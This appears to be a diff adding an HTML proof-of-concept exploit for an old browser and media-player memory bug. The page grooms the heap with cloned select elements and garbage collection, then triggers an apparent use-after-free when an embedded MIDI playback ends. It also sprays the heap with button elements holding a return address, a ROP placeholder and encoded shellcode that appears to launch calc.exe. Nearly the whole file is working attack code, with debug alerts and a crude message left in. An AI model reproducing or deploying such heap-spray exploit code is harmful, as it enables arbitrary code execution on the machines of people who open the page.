@@ -1,0 +1,152 @@
+<html>
+<head>
+
+<script language='javascript'>
+	var selob = document.createElement("select")
+selob.w0 = alert
+selob.w1 = unescape("%u2224%u2030")
+selob.w2 = alert
+selob.w3 = alert
+selob.w4 = alert
+selob.w5 = alert
+selob.w6 = alert
+selob.w7 = alert
+selob.w8 = alert
+selob.w9 = alert
+selob.w10 = alert
+selob.w11 = alert
+selob.w12 = alert
+selob.w13 = alert
+selob.w14 = alert
+selob.w15 = alert
+selob.w16 = alert
+selob.w17 = alert
+selob.w18 = alert
+selob.w19 = alert
+selob.w20 = alert
+selob.w21 = alert
+selob.w22 = alert
+selob.w23 = alert
+selob.w24 = alert
+selob.w25 = alert
+selob.w26 = alert
+selob.w27 = alert
+selob.w28 = alert
+selob.w29 = alert
+selob.w30 = alert
+selob.w31 = alert
+selob.w32 = alert
+selob.w33 = alert
+selob.w34 = alert
+selob.w35 = alert
+selob.w36 = alert
+selob.w37 = alert
+selob.w38 = alert
+selob.w39 = alert
+selob.w40 = alert
+selob.w41 = alert
+selob.w42 = alert
+selob.w43 = alert
+selob.w44 = alert
+selob.w45 = alert
+selob.w46 = alert
+selob.w47 = alert
+selob.w48 = alert
+selob.w49 = alert
+selob.w50 = alert
+selob.w51 = alert
+selob.w52 = alert
+selob.w53 = alert
+selob.w54 = alert
+selob.w55 = alert
+selob.w56 = alert
+selob.w57 = alert
+selob.w58 = alert
+selob.w59 = alert
+selob.w60 = alert
+selob.w61 = alert
+selob.w62 = alert
+selob.w63 = alert
+
+	var clones=new Array(1000);
+
+	function feng_shui() {
+
+
+		var i = 0;
+		while (i < 1000) {
+			clones[i] = selob.cloneNode(true)
+			i = i + 1;
+		}
+		var j = 0;
+		while (j < 1000) {
+			delete clones[j];
+			CollectGarbage();
+			j  = j + 2;
+		}
+	}
+
+	feng_shui();
+
+				function trigger(){
+		var k = 999;
+		while (k > 0) {
+			if (typeof(clones[k].w1) == "string") {
+			} else {
+				clones[k].w1('come on!');
+			}
+			k = k - 2;
+		}
+		alert("heap feng shui!");
+		feng_shui();
+		alert("go fuck??");
+		document.audio.Play();
+	}
+
+
+</script>
+
+</head>
+<body>
+
+	<object ID="audio" WIDTH=1 HEIGHT=1 CLASSID="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95">
+		<param name="fileName" value="test_case.mid">
+		<param name="SendPlayStateChangeEvents" value="true">
+		<param NAME="AutoStart" value="True">
+		<param name="uiMode" value="mini">
+		<param name="Volume" value="-300">
+	</object>
+	<div id='blah'></div>
+<script language='javascript'>
+         var div_container = document.getElementById('blah');
+         div_container.style.cssText = "display:none";
+         var data;
+         offset = 0x104;
+         junk = unescape("%u2020%u2020");
+         while(junk.length < 0x1000) junk+=junk;
+
+         var eip = unescape("%u222c%u2030");//call [ecx] 20302228
+		 var rop = unescape("%u4141%u4141");//rop 2030222c
+         var shellcode = unescape("%u315b%ueb16%u53bb%uc050%u867c%uad23%u31c0%uffd3%ufaca%u50bb%uffd3%u817c%uffff%ue8e5%u616c%uff63%u2e65%u6c63%u7865");//shellcode
+         data = junk.substring(0,offset) + rop + shellcode;
+         data += junk.substring(0,0x800-offset-rop.length-shellcode.length); //20+rop+shellcode+20 length==0x800
+		 document.write("data:"+data.length +"<br>");
+         while(data.length < 0x80000) data += data;
+         for (var i=0; i < 0x400; i++)
+         {
+                 var obj = document.createElement("button");
+                 obj.title = data.substring(0,0x40000-0x58);
+                 obj.style.fontFamily = data.substring(0,0x40000-0x58);
+                 div_container.appendChild(obj);
+         }
+         document.write("spray done<br>");
+</script>
+<script for=audio event=PlayStateChange(oldState,newState)>
+	if (oldState == 3 && newState == 0) {
+		alert("step 2");
+		trigger();
+	}
+	
+</script>
+</body>
+</html>
